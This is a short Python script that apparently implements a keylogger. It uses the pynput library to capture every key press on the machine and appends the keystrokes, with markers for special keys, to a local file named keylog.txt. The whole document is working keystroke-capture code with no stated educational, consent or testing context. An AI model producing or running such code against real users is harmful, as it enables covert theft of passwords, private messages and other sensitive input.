from pynput.keyboard import Listener

# File to store keystrokes
log_file = "keylog.txt"

# Function to write the key pressed to the log file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            # Remove surrounding quotes from keys
            key = str(key).replace("'", "")

            # Handle special keys like Enter, Space, etc.
            if key == 'Key.space':
                file.write(' ')  # write a space character for spacebar
            elif key == 'Key.enter':
                file.write('\n')  # write a newline for enter
            elif key == 'Key.backspace':
                file.write(' [BACKSPACE] ')
            elif key == 'Key.tab':
                file.write(' [TAB] ')
            elif key == 'Key.shift':
                file.write(' [SHIFT] ')
            elif key == 'Key.esc':
                file.write(' [ESC] ')
            else:
                file.write(key)  # write the actual key pressed
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Start listening for key press events
with Listener(on_press=on_press) as listener:
    listener.join()
